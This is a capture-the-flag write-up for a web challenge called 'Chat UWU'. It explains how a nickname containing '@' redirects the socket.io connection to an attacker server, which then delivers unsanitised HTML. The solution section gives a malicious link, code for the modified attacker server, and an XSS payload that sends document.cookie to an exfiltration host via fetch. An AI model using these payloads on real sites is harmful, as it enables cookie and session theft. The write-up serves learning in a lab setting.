### Chat UWU

## Walkthrough
- When we open ndex.js, we observe that int he below piece of code, if the chat room is 'DOMPurify' and msg.isHtml is true,
  the message is treated as HTML and inserted using innerHTML which makes it vulnerable to xss
```
socket.on('msg', function (msg) {
        let item = document.createElement('li'),
            msgtext = `[${new Date().toLocaleTimeString()}] ${msg.from}: ${msg.text}`;
        room === 'DOMPurify' && msg.isHtml ? item.innerHTML = msgtext : item.textContent = msgtext;
        messages.appendChild(item);
        window.scrollTo(0, document.body.scrollHeight);
    });
```
- Here comes the first problem that is the message and nickname are truncated and then purified,
 so the truncation itself does not allow us to inject anything that DOMPurify would normally catch

- Secondly isHtml is set to true if room is set to Dompurify.
```
socket.on('msg', msg => {
        msg.from = String(msg.from).substr(0, 16)
        msg.text = String(msg.text).substr(0, 140)
        if (room === 'DOMPurify') {
            io.to(room).emit('msg', {
                from: DOMPurify.sanitize(msg.from),
                text: DOMPurify.sanitize(msg.text),
                isHtml: true
            });
        } else {
            io.to(room).emit('msg', {
                from: msg.from,
                text: msg.text,
                isHtml: false
            });
        }
    });
```

### Solution

- Having an @ in our parameter. Everything before the @ is considered to be the username on the domain. http://127.0.0.1:58000/?nickname=@example.com/&room=DOMPurify is parsed as the domain example.com/&room=DOMPurify for the socket connection. At the same time, the get parameter room=DOMPurify allows us to still get into the innerHTML region in the client-side line of code

This makes socket.io connect to the attackers server while using room=DOMPurify as query parameetr.

## Creating exploit server
To do this we can just take the webserver code
1) Add these lines to accept connection cross-domain:
```
io.engine.on("headers", (headers, req) => {
headers["Access-Control-Allow-Origin"] = "*";
});
```
2) Remove the sanitazation of the message
```
 io.to(room).emit('msg', {
              from: msg.from,
              text: msg.text,
              isHtml: true
          });
```

## Sending the payload

1) Send our malicious link ```http://[chat_server]:58000/?nickname=x@[exploit_ip]:1231/?&room=DOMPurify```
2) Send an xss payload to get the cookies, such as ```<img src=x onerror="fetch('https://[exfil server]/'+btoa(document.cookie))">```
And we obtain the flag
